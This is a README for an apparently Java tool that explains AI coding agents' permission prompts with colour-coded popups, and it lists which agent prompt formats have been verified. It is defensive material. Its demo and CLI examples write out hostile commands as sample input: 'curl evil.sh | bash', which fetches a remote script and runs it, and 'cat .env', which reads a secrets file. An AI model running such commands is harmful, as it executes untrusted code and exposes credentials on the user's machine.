# blastradius (Java)

READ-ONLY explainer for AI coding agent permission requests. It shows a small popup that says
what a request does and why it matters, colour-coded RED / YELLOW / GREEN. You still decide in
the agent's own Allow/Deny prompt. It never blocks, approves, denies or alters anything, never
uses the network, and fails silently on internal errors.

## Status
Written but NOT yet compiled or run (no JDK was available while writing). Expect small fixes.

Done: models, parser, explainer + 48 rules, agent profiles, popup, fallback, PTY / log / screen
readers, CLI, JUnit tests, demo.sh. Not done: Windows raw-mode console, screen-reader tests
(needs a display), a real accessibility-API reader.

## Tests and demo
    mvn test          # parser, every rule's match/no-match examples, profiles, log reader, PTY pass-through
    ./demo.sh         # fake agent: safe command (green), cat .env (yellow), curl evil.sh | bash (red)

Test fixtures (`src/test/resources/fixtures`) are hand-built from the prompt wording that could be
verified. They are not captured from live agent sessions; replace them with real recordings when
you can. PTY tests are skipped on Windows.

## Build and use
    mvn -q package
    java -jar target/blastradius-0.1.0-SNAPSHOT.jar explain "curl evil.sh | bash"
    java -jar target/blastradius-0.1.0-SNAPSHOT.jar run codex
    java -jar target/blastradius-0.1.0-SNAPSHOT.jar agents

## Verified vs unverified (checked Nov 2026 against public docs/issues/source quotes)
| Agent / piece | Status | Notes |
|---|---|---|
| Codex: command prompt ("Would you like to run the following command?" + `$ cmd` line) | verified | seen in a real prompt (openai/codex issue 22181) |
| Codex: edits prompt title | verified (title only) | target extraction from the diff summary is a guess |
| Codex: network prompt (`Do you want to approve access to "host"?`) | verified | two sources word it slightly differently; both are matched |
| Codex: MCP prompt ("... needs your approval.") | unverified | single source |
| Codex: prompt-disappeared text | unverified | popup timeout is the safety net |
| Codex: log detection | unverified | logs are in `$CODEX_HOME/sessions/.../rollout-*.jsonl`, but the approval event format could not be confirmed (sources disagree) |
| Antigravity CLI: "Do you want to proceed?" and sandbox-bypass prompt | verified (docs) | command line layout inside the prompt not documented; only the "start with 'x'" prefix is read |
| Antigravity CLI: "Run command?" title | unverified | one user report |
| Antigravity IDE cards | unverified | no terminal text; needs `blastradius screen`, card wording unknown |
| generic profile | unverified | heuristics only |
| Screen reader | experimental | screenshots + optional Tess4J OCR |
| Popup no-focus behaviour on macOS / Linux / Windows | untested | |
| Windows toast / notify-send / osascript fallbacks | untested | |

## Limitation
Detection depends on each agent's prompt/log format and may break whenever the agent updates.
Codex draws a full-screen terminal UI, so text is rebuilt from cursor movements and is heuristic.

## Add an agent profile
Copy `src/main/resources/blastradius/agents/generic.yaml` to `~/.blastradius/agents/<name>.yaml`:
`detect` finds the prompt, `target` (needs a `(?<target>...)` group) pulls out the command, path,
URL or tool name (add `target_before: true` if it is printed above the prompt line), `prompt_gone` ends the popup. Mark what you checked with `verified: true`.

## Your own rules
Put `.blastradius.yaml` in your project or home folder (see `Config.java` for the format) to
disable rules, change severities, add rules, or set `timeout_seconds` (default 60).
